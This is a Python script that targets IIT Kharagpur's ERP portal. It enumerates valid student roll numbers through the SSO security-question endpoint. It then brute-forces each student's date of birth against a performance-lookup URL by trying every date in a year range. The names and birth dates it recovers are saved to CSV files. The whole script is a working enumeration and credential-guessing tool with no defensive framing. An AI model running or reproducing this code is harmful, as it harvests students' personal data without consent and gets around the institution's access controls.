import sys
import requests
import webbrowser
from datetime import timedelta, date
from datetime import datetime as dt
import time
import pandas as pd
from bs4 import BeautifulSoup

def daterange(date1, date2):
    for n in range(int ((date2 - date1).days)+1):
        yield date1 + timedelta(n)
def add_up(i):
    if i<10:
        return "0"+str(i)
    else:
        return str(i)

def get_special(dp,y):
    if(y==1 or y==2):
        return ["00"]
    elif(dp=='MF'):
        return ["IM","EP","FP"]
    elif(dp=="QE" or dp=="QM" or dp=="QD"):
        return ["00"]
    elif(dp=="AG"):
        return ["00","20","40","50","60","80","FP","EP"]
    elif(dp=="CE"):
        return ["00","10","30","40","50","60","FP","EP"]
    elif(dp=="EE"):
        return ["00","20","30","50","60","FP","EP"]
    elif(dp=="IE"):
        return ["00","20","30","FP","EP"]
    elif(dp=="EC"):
        return ["00","10","20","40","50","60","FP","EP"]
    elif(dp=="ME"):
        return ["00","10","20","30","FP","EP"]
    elif(dp=="MI"):
        return ["00","10","30","FP","EP"]
    else:
        return ["00","FP","EP"]
        

def unicore(roll):
    expectedStart=2000+int(roll[:2])-18
    #start2=expectedStart
    #adder=1
    #count=1
    #a=find(roll,start2,start2+1)
    #while(a==0):
    #    adder=adder*(-1)*count
    #    start2=start2+adder
    #    count+=1
    #    a=find(roll,start2,start2+1)
    #print(time.clock())    
    #return a
    y=expectedStart
    yn=y-1
    ctr=1
    a=0
    while ctr<=10:
        f=(ctr%2)*2-1
        if(f==1):
            a=find(roll, y, y+1)
            y+=f
        elif(f==-1):
            a=find(roll, yn, yn+1)
            yn+=f
        if(a!=0):
            print(dt.strftime(dt.now(),"%d %b %y, %H:%M:%S"))
            return a
        ctr+=1

def find(roll, ystart, yend):
    url="https://erp.iitkgp.ac.in/StudentPerformanceV2/auth/authenticate.htm?rollno="+roll+"&dob="
    start_dt = date(int(ystart),5, 1)
    end_dt = date(int(yend), 4, 30)
    dob=daterange(start_dt, end_dt)
    f=open("gru.txt","r+")
    c2=f.read()
    flag=0
    for dt in dob:
        date_value=dt.strftime("%d-%m-%Y")
        name=""
        print(date_value,end='\r')
        result=requests.get(url+date_value)
        c=result.content
        if str(c)==c2:
            continue
        else:
            flag=1
            #webbrowser.open(url+dt.strftime("%d-%m-%Y"))
            soup=BeautifulSoup(c,"lxml")
            all1=soup.find_all("div",{"class","form-group"})
            name=all1[1].text.split('\n')[2].strip()
            break
    if flag==0:
        return 0
    else:
        return [roll,name,date_value]

def core(yno,dno,roll="start"):
    #roll=sys.argv[1]
    #yno =int(sys.argv[2])
    #dno =int(sys.argv[3])
    if roll == 'reset':
        url="https://erp.iitkgp.ac.in/StudentPerformanceV2/auth/authenticate.htm?rollno=15QBT0012&dob=01-01-2000"
        f=open("gru.txt","w+")
        result=requests.get(url)
        f.write(str(result.content))
        print("File Reset Successful")
        exit()
    if roll=="start":
        #dno  #yno
        y1=[1]
        y2=[2]
        y3=[3]
        y4=[1,3]
        dept_list=["AE", "AG", "AR", "BT", "CH","CY", "CE", "CS", "EE", "IE", "EC", "EX", "GG", "HS", "IM", "QM", "QE","QD", "MA","ME", "MF", "MT", "MI", "NA", "PH"]
        dept_assoc=[y4 , y4, y1, y4, y4, y2, y4, y4, y4, y1, y4, y2, y2, y2, y4, y3, y3, y3, y2, y4, y4, y4, y4, y4, y2]
        dept_full=[]
        for i in range(len(dept_list)):
            dp=dept_list[i]
            for j in dept_assoc[i]:
                y = get_special(dp,j)
                for ty in y:
                    dept_full.append(dp+str(j)+ty)
        #print(dept_full)
        #df=pd.DataFrame(dept_full,columns=["Dept"])
        #df.to_csv("dept-names.csv")
        yr=yno
        ending_yr=yno+1
        i=dno
        fail_count=0
        dep_len=dno+1
		
        try:
            df=pd.read_csv(str(yr)+dept_full[i]+".csv").iloc[:,1:]
            x=df.shape[0]+1
        except FileNotFoundError:
            x=1
            df=pd.DataFrame(columns=["Roll No.","Name","Date of Birth"])

        while(yr<ending_yr):
            rollno=str(yr)+dept_full[i]+add_up(x)
            session=requests.Session()
            response=session.get("https://erp.iitkgp.ac.in/SSOAdministration/login.htm?sessionToken=F34F577424B30ED0148C0020EE86FD64.worker2&requestedUrl=https://erp.iitkgp.ac.in/IIT_ERP3/")
            cookie=session.cookies.get_dict()
            r=requests.post("https://erp.iitkgp.ac.in/SSOAdministration/getSecurityQues.htm?user_id="+rollno,cookies=cookie)
            cont=r.content
            cont=cont.decode('ASCII')
            print(rollno)
            if cont!="FALSE":
                #print(time.clock())
                print(dt.strftime(dt.now(),"%d %b %y, %H:%M:%S"))
                fail_count=0
                dat=unicore(rollno)
                df.loc[x-1]=dat
                df.to_csv(str(yr)+dept_full[i]+".csv")
                print(dat)
                x+=1

            else:
                fail_count+=1
                x+=1
                if fail_count==21:
                    fail_count=0
                    i+=1
                    x=1
                if i==dep_len :
                    yr+=1
                    i=0
                    x=1
                    fail_count=0


if __name__=="__main__":
    roll=sys.argv[1]
    yno =int(sys.argv[2])
    dno =int(sys.argv[3])
    core(yno,dno)